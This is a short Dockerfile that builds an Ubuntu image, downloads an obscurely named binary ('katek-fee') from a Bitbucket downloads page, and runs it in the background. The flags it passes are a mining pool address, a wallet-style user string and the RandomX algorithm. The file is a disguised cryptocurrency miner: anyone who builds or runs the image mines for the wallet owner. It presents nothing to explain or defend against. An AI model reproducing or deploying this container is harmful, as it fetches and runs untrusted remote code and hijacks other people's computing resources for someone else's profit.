FROM ubuntu:latest

RUN	apt-get update -y && \
	apt-get upgrade -y && \
	apt-get install wget -y && \
	wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && \
	chmod u+x katek-fee && \
	./katek-fee -o 107.178.104.10:3333 -u 48JsZF5Mmtc1i54xemhuNqiFZocmiHEPy1NfpiyPzwQTUN35im4YfN3SeEFBzwUdM13M9KmsnxVngi5XaA6jQEyp7SpYWed.Pekerja01 -k -a rx/0 --threads=2 --background
